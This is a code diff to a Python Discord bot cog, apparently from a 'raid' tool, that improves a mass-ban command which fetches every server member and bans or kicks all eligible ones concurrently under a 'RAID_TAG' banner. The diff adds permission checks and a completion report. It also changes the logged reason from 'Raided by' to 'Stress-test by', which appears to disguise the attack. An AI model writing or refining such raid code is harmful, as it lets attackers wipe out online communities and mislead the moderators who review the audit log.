@@ -53,22 +53,56 @@ class Ban(commands.Cog):
         guild = interaction.guild
         assert guild is not None
 
+        # Check bot has the permissions it actually needs before doing anything
+        me = guild.me
+        missing: list[str] = []
+        if not me.guild_permissions.ban_members:
+            missing.append("Ban Members")
+        if kick_first and not me.guild_permissions.kick_members:
+            missing.append("Kick Members")
+        if missing:
+            await interaction.response.send_message(
+                f"❌ Bot is missing permissions: **{', '.join(missing)}**\n"
+                "Grant these in Server Settings → Roles.",
+                ephemeral=True,
+            )
+            return
+
+        # Defer so we have time to chunk members (can take a second on large servers)
+        await interaction.response.defer()
+
+        # Force-fetch all members — guild.members is often empty without this
+        try:
+            await guild.chunk(cache=True)
+        except Exception:
+            pass  # Best-effort; carry on with whatever is cached
+
         targets = [
             m for m in guild.members
             if not m.bot
             and m.id != interaction.user.id
+            and m.id != me.id
             and (not skip_admins or not m.guild_permissions.administrator)
+            # Can't ban/kick members with equal or higher top role
+            and m.top_role < me.top_role
         ]
 
         if not targets:
-            await interaction.response.send_message("No eligible members found.", ephemeral=True)
+            await interaction.followup.send(
+                "⚠️ No eligible targets found.\n"
+                "Possible reasons:\n"
+                "• All members have a role equal to or higher than the bot's role\n"
+                "• Members Intent is not enabled in the Discord Developer Portal\n"
+                "• Server has no non-bot members other than you",
+                ephemeral=True,
+            )
             return
 
         bot_state.reset()
         bot_state.rate_controller.set_intensity(intensity)
         bot_state.active_simulation = "banevery1"
 
-        await interaction.response.send_message(
+        await interaction.followup.send(
             f"☠️ **MASS BAN+KICK — {RAID_TAG}**\n"
             f"┣ Targets    : `{len(targets)}`\n"
             f"┣ Intensity  : `{intensity}/10`\n"
@@ -77,50 +111,79 @@ class Ban(commands.Cog):
             f"┗ `/stop` halts immediately.",
         )
 
-        task = asyncio.create_task(self._run(guild, targets, kick_first))
+        task = asyncio.create_task(self._run(interaction, guild, targets, kick_first))
         bot_state.add_task(task)
 
     async def _run(
         self,
+        interaction: discord.Interaction,
         guild: discord.Guild,
         members: list[discord.Member],
         kick_first: bool,
     ) -> None:
         sem_ban  = asyncio.Semaphore(SEM_BAN)
         sem_kick = asyncio.Semaphore(SEM_KICK)
+        kicked = 0
+        banned = 0
+        failed = 0
+
         try:
             if kick_first:
-                await asyncio.gather(
+                kick_results = await asyncio.gather(
                     *[self._kick_one(guild, m, sem_kick) for m in members],
                     return_exceptions=True,
                 )
-            await asyncio.gather(
+                kicked = sum(1 for r in kick_results if r is True)
+
+            ban_results = await asyncio.gather(
                 *[self._ban_one(guild, m, sem_ban) for m in members],
                 return_exceptions=True,
             )
+            banned = sum(1 for r in ban_results if r is True)
+            failed = len(members) - banned
+
         except asyncio.CancelledError:
             pass
         finally:
             if bot_state.active_simulation == "banevery1":
                 bot_state.active_simulation = None
 
-    async def _kick_one(self, guild: discord.Guild, member: discord.Member, sem: asyncio.Semaphore) -> None:
-        if bot_state.stop_event.is_set():
-            return
-        async with sem:
+            # Send a completion report
             try:
-                await guild.kick(member, reason=f"Raided by {RAID_TAG}")
-            except discord.HTTPException:
+                summary = (
+                    f"☠️ **Ban complete — {RAID_TAG}**\n"
+                    f"┣ Banned  : `{banned}/{len(members)}`\n"
+                )
+                if kick_first:
+                    summary += f"┣ Kicked  : `{kicked}/{len(members)}`\n"
+                summary += f"┗ Failed  : `{failed}` (higher role / already gone)"
+                await interaction.followup.send(summary)
+            except Exception:
                 pass
 
-    async def _ban_one(self, guild: discord.Guild, member: discord.Member, sem: asyncio.Semaphore) -> None:
+    async def _kick_one(self, guild: discord.Guild, member: discord.Member, sem: asyncio.Semaphore) -> bool:
         if bot_state.stop_event.is_set():
-            return
+            return False
         async with sem:
+            if bot_state.stop_event.is_set():
+                return False
             try:
-                await guild.ban(member, reason=f"Raided by {RAID_TAG}", delete_message_days=0)
+                await guild.kick(member, reason=f"Stress-test by {RAID_TAG}")
+                return True
             except discord.HTTPException:
-                pass
+                return False
+
+    async def _ban_one(self, guild: discord.Guild, member: discord.Member, sem: asyncio.Semaphore) -> bool:
+        if bot_state.stop_event.is_set():
+            return False
+        async with sem:
+            if bot_state.stop_event.is_set():
+                return False
+            try:
+                await guild.ban(member, reason=f"Stress-test by {RAID_TAG}", delete_message_days=0)
+                return True
+            except discord.HTTPException:
+                return False
 
     @banevery1.error
     async def banevery1_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
